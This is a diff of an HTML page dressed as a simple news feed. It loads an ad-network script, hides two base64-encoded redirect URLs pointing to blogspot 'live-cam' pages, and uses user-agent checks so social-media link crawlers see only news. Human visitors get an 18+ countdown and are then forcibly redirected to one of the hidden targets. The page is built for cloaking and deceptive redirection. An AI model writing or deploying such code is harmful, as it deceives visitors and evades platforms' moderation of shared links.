@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>News Updates (with Banner)</title>
+  <title>News Updates</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
@@ -12,10 +12,11 @@
       padding: 20px;
       background: #f0f2f5;
       color: #333;
+      
     }
     .banner {
-      margin-bottom: 20px;
       text-align: center;
+      margin-bottom: 20px;
     }
     .simple-countdown {
       text-align: center;
@@ -88,17 +89,20 @@
   </style>
 </head>
 <body>
-
-  <!-- 🪧 BANNER -->
-  <div class="banner">
-    <script async="async" data-cfasync="false" src="//oblivionplaysaltered.com/8e7b09b4d12552eca1c325a5cdeec882/invoke.js"></script>
+  <div class="banner" id="banner-area">
+    <script 
+      data-cfasync="false" 
+      src="//oblivionplaysaltered.com/8e7b09b4d12552eca1c325a5cdeec882/invoke.js"
+      onload="initPageAfterBanner()"
+      onerror="initPageAfterBanner(true)">
+    </script>
     <div id="container-8e7b09b4d12552eca1c325a5cdeec882"></div>
   </div>
 
   <div class="simple-countdown" id="countdown-section">
     <div>Please wait</div>
     <div class="countdown-number" id="countdown">7</div>
-    <div>Warning! The content you are about to watch may not be appropriate for viewers under 18 years old.</div>
+    <div>This content is 18+. Please use your discretion before watching.</div>
   </div>
 
   <div class="subdomain-info" id="subdomain-info">
@@ -113,90 +117,105 @@
   </div>
 
   <script>
-    const ENCRYPTED_TARGETS = [
-      'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
-      'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
-    ];
+    let bannerTimeout = setTimeout(() => {
+      console.warn("Banner timeout after 5s — continuing page load...");
+      initPageAfterBanner(true);
+    }, 5000);
 
-    function decryptTarget(encrypted) {
-      return atob(encrypted);
-    }
+    function initPageAfterBanner(error) {
+      if (window.__bannerLoaded) return; 
+      window.__bannerLoaded = true;
+      clearTimeout(bannerTimeout);
 
-    function getRandomTarget() {
-      const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
-      return decryptTarget(ENCRYPTED_TARGETS[idx]);
-    }
+      console.log(error ? "Banner load failed or timed out" : "Banner loaded successfully");
+      document.body.style.display = "block"; 
 
-    function isFacebookBot() {
-      return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
-    }
+      const ENCRYPTED_TARGETS = [
+        'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWJyb2FkY2FzdC5odG1s',
+        'aHR0cHM6Ly9iaW5hNTIweC5ibG9nc3BvdC5jb20vcC9saXZlLWNhbS5odG1s'
+      ];
 
-    // ✅ LOAD NEWS WITH THUMBNAIL (BBC feed - real images)
-    async function loadSimpleNews() {
-      const container = document.getElementById('news-container');
-      const rssURL = 'https://feeds.bbci.co.uk/news/rss.xml'; 
-      const apiURL = `https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssURL)}`;
+      function decryptTarget(encrypted) {
+        return atob(encrypted);
+      }
 
-      try {
-        const res = await fetch(apiURL);
-        const data = await res.json();
+      function getRandomTarget() {
+        const idx = Math.floor(Math.random() * ENCRYPTED_TARGETS.length);
+        return decryptTarget(ENCRYPTED_TARGETS[idx]);
+      }
 
-        if (!data.items || !data.items.length) {
-          container.innerHTML = '<div class="loading">No news found.</div>';
+      function isFacebookBot() {
+        return /facebookexternalhit|Facebot|Twitterbot|LinkedInBot/i.test(navigator.userAgent);
+      }
+
+      async function loadSimpleNews() {
+        const container = document.getElementById('news-container');
+        const rssURL = 'https://rss.app/feeds/v1.1/7zX3QG5s4o7LxFZx.xml';
+
+        try {
+          const res = await fetch(rssURL);
+          const text = await res.text();
+          const parser = new DOMParser();
+          const xml = parser.parseFromString(text, "application/xml");
+          const items = xml.querySelectorAll("item");
+
+          if (!items.length) {
+            container.innerHTML = '<div class="loading">No news found.</div>';
+            return;
+          }
+
+          let newsHTML = "";
+          items.forEach((item, i) => {
+            if (i >= 8) return;
+            const title = item.querySelector("title")?.textContent || "Untitled";
+            const link = item.querySelector("link")?.textContent || "#";
+            const pubDate = new Date(item.querySelector("pubDate")?.textContent).toLocaleDateString();
+            const media = item.querySelector("media\\:content, enclosure");
+            const thumb = media?.getAttribute("url") || "https://via.placeholder.com/100x70?text=News";
+
+            newsHTML += `
+              <div class="news-item">
+                <img class="news-thumb" src="${thumb}" alt="">
+                <div class="news-content">
+                  <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
+                  <div class="news-meta">
+                    <span>Google News</span>
+                    <span>${pubDate}</span>
+                  </div>
+                </div>
+              </div>
+            `;
+          });
+
+          container.innerHTML = newsHTML;
+        } catch (err) {
+          console.error("RSS load error:", err);
+          container.innerHTML = '<div class="loading">⚠️ Unable to load news.</div>';
+        }
+      }
+
+      function startCountdown() {
+        if (isFacebookBot()) {
+          document.getElementById('countdown-section').style.display = 'none';
+          document.getElementById('subdomain-info').style.display = 'none';
           return;
         }
 
-        let newsHTML = '';
-        data.items.slice(0, 8).forEach(item => {
-          const title = item.title;
-          const link = item.link;
-          const pubDate = new Date(item.pubDate).toLocaleDateString();
-          const thumb = item.thumbnail || 'https://via.placeholder.com/100x70?text=News';
-
-          newsHTML += `
-            <div class="news-item">
-              <img class="news-thumb" src="${thumb}" alt="">
-              <div class="news-content">
-                <div class="news-title"><a href="${link}" target="_blank">${title}</a></div>
-                <div class="news-meta">
-                  <span>${data.feed.title}</span>
-                  <span>${pubDate}</span>
-                </div>
-              </div>
-            </div>
-          `;
-        });
-
-        container.innerHTML = newsHTML;
-      } catch (err) {
-        console.error("RSS load error:", err);
-        container.innerHTML = '<div class="loading">⚠️ Unable to load news.</div>';
-      }
-    }
-
-    function startCountdown() {
-      if (isFacebookBot()) {
-        document.getElementById('countdown-section').style.display = 'none';
-        document.getElementById('subdomain-info').style.display = 'none';
-        return;
+        let seconds = 5;
+        const countdownEl = document.getElementById('countdown');
+        const timer = setInterval(() => {
+          seconds--;
+          countdownEl.textContent = seconds;
+          if (seconds <= 0) {
+            clearInterval(timer);
+            window.location.href = getRandomTarget();
+          }
+        }, 1000);
       }
 
-      let seconds = 7;
-      const countdownEl = document.getElementById('countdown');
-      const timer = setInterval(() => {
-        seconds--;
-        countdownEl.textContent = seconds;
-        if (seconds <= 0) {
-          clearInterval(timer);
-          window.location.href = getRandomTarget();
-        }
-      }, 1000);
-    }
-
-    document.addEventListener('DOMContentLoaded', () => {
       loadSimpleNews();
       startCountdown();
-    });
+    }
   </script>
 </body>
 </html>
